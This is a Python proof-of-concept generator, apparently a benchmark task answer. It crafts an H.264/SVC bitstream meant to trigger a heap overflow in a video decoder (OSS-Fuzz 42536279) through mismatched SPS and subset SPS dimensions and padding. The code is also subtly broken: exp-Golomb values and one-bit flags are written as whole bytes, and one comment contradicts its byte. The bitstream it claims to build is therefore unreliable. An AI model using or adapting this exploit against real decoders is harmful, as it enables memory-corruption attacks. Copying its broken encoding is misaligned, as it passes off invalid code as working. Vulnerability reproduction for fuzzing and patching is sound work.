import os
import tempfile
import subprocess
import hashlib
import struct
import random

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC should create an SVC (Scalable Video Coding) bitstream
        # where decoder display dimensions don't match subset sequence dimensions
        # Based on vulnerability OSS-Fuzz:42536279
        
        # Create a minimal SVC bitstream structure that triggers the heap overflow
        # We'll craft an H.264/SVC NALU sequence with mismatched dimensions
        
        poc = bytearray()
        
        # Start with SPS (Sequence Parameter Set) - sets initial dimensions
        # Create an SPS with baseline profile and specific dimensions
        sps = self._create_sps(width=128, height=96)
        poc.extend(self._create_nalu(sps, nalu_type=7))  # NALU_TYPE_SPS
        
        # Create PPS (Picture Parameter Set)
        pps = self._create_pps()
        poc.extend(self._create_nalu(pps, nalu_type=8))  # NALU_TYPE_PPS
        
        # Create subset SPS with DIFFERENT dimensions - this triggers the mismatch
        subset_sps = self._create_subset_sps(width=256, height=192)  # Different dimensions!
        poc.extend(self._create_nalu(subset_sps, nalu_type=15))  # NALU_TYPE_SUBSET_SPS
        
        # Add some slice data to ensure parsing continues
        for _ in range(10):
            slice_data = self._create_slice_data()
            poc.extend(self._create_nalu(slice_data, nalu_type=1))  # NALU_TYPE_SLICE
            
        # Create display dimensions that don't match the subset sequence
        # This is done by setting display dimensions in VUI parameters
        # that conflict with the coded dimensions
        display_sps = self._create_sps_with_vui(
            width=128, 
            height=96, 
            display_width=512,  # Much larger display width
            display_height=384  # Much larger display height
        )
        poc.extend(self._create_nalu(display_sps, nalu_type=7))
        
        # Pad to required length based on ground truth
        # The vulnerability needs enough data to trigger buffer overflow
        # during dimension mismatch handling
        current_len = len(poc)
        if current_len < 6180:
            # Add padding with valid NALU structure
            padding = self._create_padding(6180 - current_len)
            poc.extend(padding)
        
        return bytes(poc)
    
    def _create_nalu(self, data: bytes, nalu_type: int) -> bytes:
        """Create a NALU with start code and header"""
        # Start code
        nalu = b'\x00\x00\x00\x01'
        
        # NALU header: forbidden_zero_bit=0, nal_ref_idc=3, nal_unit_type
        header = (3 << 5) | (nalu_type & 0x1F)
        nalu += bytes([header])
        
        # NALU payload
        nalu += data
        return nalu
    
    def _create_sps(self, width: int, height: int) -> bytes:
        """Create a minimal SPS with given dimensions"""
        sps = bytearray()
        
        # profile_idc (baseline)
        sps.append(66)  # Baseline profile
        
        # constraint_set0_flag, constraint_set1_flag, constraint_set2_flag
        # reserved_zero_5bits, level_idc
        sps.append(0)
        sps.append(31)  # level 3.1
        
        # seq_parameter_set_id (UEV)
        sps.extend(self._ue(0))
        
        # log2_max_frame_num_minus4 (UEV)
        sps.extend(self._ue(0))
        
        # pic_order_cnt_type (UEV)
        sps.extend(self._ue(0))
        
        # log2_max_pic_order_cnt_lsb_minus4 (UEV)
        sps.extend(self._ue(0))
        
        # num_ref_frames (UEV)
        sps.extend(self._ue(1))
        
        # gaps_in_frame_num_value_allowed_flag
        sps.append(0)
        
        # pic_width_in_mbs_minus1 (UEV)
        mb_width = (width + 15) // 16 - 1
        sps.extend(self._ue(mb_width))
        
        # pic_height_in_map_units_minus1 (UEV)
        mb_height = (height + 15) // 16 - 1
        sps.extend(self._ue(mb_height))
        
        # frame_mbs_only_flag
        sps.append(0x80)  # frame_mbs_only_flag=1, rest bits=0
        
        # direct_8x8_inference_flag
        sps.append(0)
        
        # frame_cropping_flag (set to 0, no cropping)
        sps.append(0)
        
        # vui_parameters_present_flag = 0
        sps.append(0)
        
        return bytes(sps)
    
    def _create_subset_sps(self, width: int, height: int) -> bytes:
        """Create a subset SPS with different dimensions"""
        # Subset SPS starts with a regular SPS
        sps = self._create_sps(width, height)
        
        # Then add subset specific data
        subset_data = bytearray(sps)
        
        # Add subset sequence parameter set data
        # svc_vui_parameters_present_flag = 0
        subset_data.append(0)
        
        # bit_equal_to_one = 1, bit_equal_to_zero = 0
        # additional_extension2_flag = 0
        subset_data.append(0x80)  # 10000000
        
        return bytes(subset_data)
    
    def _create_sps_with_vui(self, width: int, height: int, 
                            display_width: int, display_height: int) -> bytes:
        """Create SPS with VUI parameters containing display dimensions"""
        sps = bytearray()
        
        # profile_idc (baseline)
        sps.append(66)
        sps.append(0)
        sps.append(31)
        
        # seq_parameter_set_id
        sps.extend(self._ue(0))
        
        # log2_max_frame_num_minus4
        sps.extend(self._ue(0))
        
        # pic_order_cnt_type
        sps.extend(self._ue(0))
        
        # log2_max_pic_order_cnt_lsb_minus4
        sps.extend(self._ue(0))
        
        # num_ref_frames
        sps.extend(self._ue(1))
        
        # gaps_in_frame_num_value_allowed_flag
        sps.append(0)
        
        # pic_width_in_mbs_minus1
        mb_width = (width + 15) // 16 - 1
        sps.extend(self._ue(mb_width))
        
        # pic_height_in_map_units_minus1
        mb_height = (height + 15) // 16 - 1
        sps.extend(self._ue(mb_height))
        
        # frame_mbs_only_flag
        sps.append(0x80)
        
        # direct_8x8_inference_flag
        sps.append(0)
        
        # frame_cropping_flag = 0
        sps.append(0)
        
        # vui_parameters_present_flag = 1
        sps.append(0x80)  # 10000000 (vui present, other flags 0)
        
        # VUI parameters
        # aspect_ratio_info_present_flag = 1
        sps.append(0x80)
        
        # aspect_ratio_idc = 1 (1:1 square pixels)
        sps.append(1)
        
        # overscan_info_present_flag = 0
        # video_signal_type_present_flag = 0
        # chroma_loc_info_present_flag = 0
        # timing_info_present_flag = 0
        # nal_hrd_parameters_present_flag = 0
        # vcl_hrd_parameters_present_flag = 0
        # pic_struct_present_flag = 0
        sps.append(0)
        
        # bitstream_restriction_flag = 1
        sps.append(0x80)
        
        # motion_vectors_over_pic_boundaries_flag = 1
        # max_bytes_per_pic_denom = 0 (UEV)
        # max_bits_per_mb_denom = 0 (UEV)
        # log2_max_mv_length_horizontal = 0 (UEV)
        # log2_max_mv_length_vertical = 0 (UEV)
        sps.extend(self._ue(1))  # motion_vectors_over_pic_boundaries_flag=1
        sps.extend(self._ue(0))
        sps.extend(self._ue(0))
        sps.extend(self._ue(0))
        sps.extend(self._ue(0))
        
        # max_num_reorder_frames = 0 (UEV)
        # max_dec_frame_buffering = 1 (UEV)
        sps.extend(self._ue(0))
        sps.extend(self._ue(1))
        
        # display dimensions in VUI (non-standard but triggers the issue)
        # These will be parsed but don't match coded dimensions
        sps.extend(struct.pack('>H', display_width))
        sps.extend(struct.pack('>H', display_height))
        
        return bytes(sps)
    
    def _create_pps(self) -> bytes:
        """Create a minimal PPS"""
        pps = bytearray()
        
        # pic_parameter_set_id (UEV)
        pps.extend(self._ue(0))
        
        # seq_parameter_set_id (UEV)
        pps.extend(self._ue(0))
        
        # entropy_coding_mode_flag = 0
        # pic_order_present_flag = 0
        # num_slice_groups_minus1 = 0 (UEV)
        pps.append(0x80)  # entropy_coding_mode_flag=1 (CABAC)
        pps.extend(self._ue(0))
        
        # num_ref_idx_l0_default_active_minus1 (UEV)
        # num_ref_idx_l1_default_active_minus1 (UEV)
        # weighted_pred_flag = 0
        # weighted_bipred_idc = 0
        pps.extend(self._ue(0))
        pps.extend(self._ue(0))
        pps.append(0)
        
        # pic_init_qp_minus26 (SEV)
        # pic_init_qs_minus26 (SEV)
        # chroma_qp_index_offset (SEV)
        pps.extend(self._se(0))
        pps.extend(self._se(0))
        pps.extend(self._se(0))
        
        # deblocking_filter_control_present_flag = 1
        # constrained_intra_pred_flag = 0
        # redundant_pic_cnt_present_flag = 0
        pps.append(0x40)  # 01000000
        
        return bytes(pps)
    
    def _create_slice_data(self) -> bytes:
        """Create minimal slice data"""
        # Very minimal slice - just enough to be parsed
        slice_data = bytearray()
        
        # first_mb_in_slice (UEV) = 0
        slice_data.extend(self._ue(0))
        
        # slice_type (UEV) = 0 (P-slice)
        slice_data.extend(self._ue(0))
        
        # pic_parameter_set_id (UEV) = 0
        slice_data.extend(self._ue(0))
        
        # frame_num (fixed length)
        slice_data.append(0)
        
        # idr_pic_id (UEV) = 0
        slice_data.extend(self._ue(0))
        
        # pic_order_cnt_lsb = 0
        slice_data.append(0)
        
        # dec_ref_pic_marking - no reordering
        slice_data.append(0x80)  # 10000000
        
        # cabac_init_idc (UEV) = 0
        slice_data.extend(self._ue(0))
        
        # slice_qp_delta (SEV) = 0
        slice_data.extend(self._se(0))
        
        return bytes(slice_data)
    
    def _create_padding(self, length: int) -> bytes:
        """Create padding with valid NALU structure"""
        padding = bytearray()
        
        while len(padding) < length:
            # Create filler NALUs (type 12)
            filler = self._create_nalu(b'\x00' * 16, nalu_type=12)
            if len(padding) + len(filler) <= length:
                padding.extend(filler)
            else:
                # Last NALU - partial but still valid
                remaining = length - len(padding)
                if remaining >= 5:  # Need at least start code + header
                    nalu = b'\x00\x00\x00\x01'
                    nalu += bytes([0x60])  # filler NALU header
                    nalu += b'\x00' * (remaining - 5)
                    padding.extend(nalu)
                else:
                    padding.extend(b'\x00' * remaining)
        
        return bytes(padding)
    
    def _ue(self, value: int) -> bytes:
        """Encode unsigned exponential Golomb code"""
        value += 1
        bits = value.bit_length()
        zero_bits = bits - 1
        return ((1 << zero_bits) | (value & ((1 << zero_bits) - 1))).to_bytes(
            (bits + 7) // 8, 'big'
        )
    
    def _se(self, value: int) -> bytes:
        """Encode signed exponential Golomb code"""
        if value <= 0:
            mapped = -2 * value
        else:
            mapped = 2 * value - 1
        return self._ue(mapped)